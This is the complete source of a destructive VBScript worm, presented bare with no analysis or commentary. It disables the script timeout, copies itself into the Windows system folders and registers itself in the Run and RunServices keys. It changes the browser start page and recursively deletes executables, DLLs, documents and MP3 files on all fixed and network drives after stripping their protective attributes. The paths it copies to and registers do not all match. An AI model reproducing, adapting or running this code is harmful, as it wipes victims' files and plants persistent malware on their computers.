on error resume next
dim fso,dirwin,dirsystem
set fso=CreateObject("Scripting.FileSystemObject")
main()
sub main()
on error resume next
set timeover=CreateObject("WScript.Shell")
rr=timeover.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Setting\Timeout")
if (rr>=1) then
timeover.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Setting\Timeout",0,"REG_DWORD"
end if
Set dirwin=fso.GetSpecialFolder(0)
Set dirsystem=fso.GetSpecialFolder(1)
Set c=fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel.vbs")
c.Copy(dirwin&"\Win32Dll.vbs")
timeover.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
timeover.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32Dll",dirwin&"\Win32Dll.vbs"
timeover.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32Dll",dirwin&"\Win32Dll.vbs"
timeover.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.hziee.edu.cn"
listdriv()
end sub
sub listdriv()
on error resume next
Dim d,dc
Set dc=fso.Drives
For Each d in dc
if d.DriveType=2 or d.Drivetype=3then
folderlist(d.path&"\")
end if
next
end sub
sub infectfiles(folderspec)
on error resume next
dim f,f1,fc,ext
set f=fso.GetFolder(folderspec)
set fc=f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
if (ext="exe")or(ext="dll")or(ext="dat") or (ext="mp3") or (ext="doc") or (ext="mp3") then
set att=fso.getfile(f1.path)
if(att.attributes=1)or(att.attributes=3)or(att.attributes=5)or(att.attributes=7)or(att.attributes=33)or(att.attributes=35)or(att.attributes=37)or(att.attributes=39) then
att.attributes=att.attributes-1
end if
if(att.attributes=4)or(att.attributes=5)or(att.attributes=6)or(att.attributes=7)or(att.attributes=36)or(att.attributes=38)then
att.attributes=att.attributes-4
end if
fso.deletefile(f1.path)
end if
next
end sub
sub folderlist(folderspec)
on error resume next
dim f,f1,sf
set f=fso.GetFolder(folderspec)
set sf=f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next
end sub

